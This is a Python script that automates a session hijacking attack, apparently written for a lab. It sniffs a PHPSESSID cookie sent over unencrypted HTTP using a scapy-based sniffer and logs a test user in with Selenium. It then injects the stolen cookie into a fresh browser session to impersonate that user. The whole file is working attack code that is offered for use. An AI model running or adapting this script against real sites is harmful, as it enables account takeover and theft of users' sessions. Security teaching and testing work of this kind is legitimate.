import requests
import cookielib
from scapy.all import *
from selenium.common.exceptions import NoSuchElementException

# For session hijacking attack
# 1. Log in as normal user i.e. bryce, then we get the cookie 
# 2. Send a request to a page after login i.e. /home.php using bryce cookie

# Automate login
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import requests, time
from sniffer import *

class Session_Hijack:
	cookie_sniffed = ''
	
	def __init__(self, url, homeurl, element_name, element_pwd, user, pwd):
		self._url = url
		self._homeurl = homeurl
		self._elname = element_name
		self._elpwd = element_pwd
		self._user = user
		self._pwd = pwd
	
	# Init sniffing module
	def start_hijack(self):
		# Callback for sniffing module
		# When cookie is found, assign it to global variable for 
		# access later.
		def sniffing_callback(cookie_detected, cookie):
			if cookie_detected:
				print('\033[92m Cookie found: ' + cookie + ' \033[0m')
				self.cookie_sniffed = cookie
			else:
				print('\033[91m Cookie not found. Terminating... \033[0m')

		caps = DesiredCapabilities.FIREFOX
		caps["marionette"] = True
		caps["binary"] = "/usr/bin/firefox"
		caps["acceptInsecureCerts"] = True

		#cookie_sniffed = ''
		sniffer = Sniffer()

		# Open the browser and go to website
		driver = webdriver.Firefox(capabilities=caps, executable_path='./geckodriver')
		driver.get(self._url)

		# Start sniffing, sniffer will run in the background
		sniffer.start_sniffing(sniffing_callback)

		# Wait for things to settle down
		time.sleep(2)

		# Refresh the page to get the cookie over HTTP
		# Caveat: We can only get the cookie from FF only if we refresh the page.
		driver.get(self._url)

		# By now, cookie_sniffed has the value for PHPSESSID

		# Login the user to this session. PHP server will remember that this
		# user is logged in to this session. We will then masquerade as this user
		# with his PHPSESSID later on.
		self._login(driver)

		# Close the browser so that we can initiate a new session.
		driver.quit()

		# Wait for driver to deinit.
		time.sleep(2)

		# Open up a new session for the website.
		driver = webdriver.Firefox(capabilities=caps, executable_path='./geckodriver')
		driver.get(self._url)

		# Delete all cookies, i.e. remove new PHPSESSID
		driver.delete_all_cookies()

		# Add the one we sniffed earlier.
		driver.add_cookie({'name': self.cookie_sniffed.split('=')[0], 'value': self.cookie_sniffed.split('=')[1]})

		# Viola, we are logged in as the user.
		time.sleep(2)
		driver.get(self._homeurl)

		#driver.close()
		#driver.quit()

	def _login(self, driver):
		username_field = driver.find_element_by_name(self._elname)
		password_field = driver.find_element_by_name(self._elpwd)
		try:
			login_button = driver.find_element_by_xpath('//input[@type="submit"]')
		except NoSuchElementException:
			login_button = driver.find_element_by_xpath('//button[@type="submit"]')
		username_field.send_keys(self._user)
		password_field.send_keys(self._pwd)
		login_button.click()

al = Session_Hijack('http://app9.com/index-test.php', 'https://app9.com/index-test.php', 'LoginForm[username]', 'LoginForm[password]', 'test', 'test')
al.start_hijack()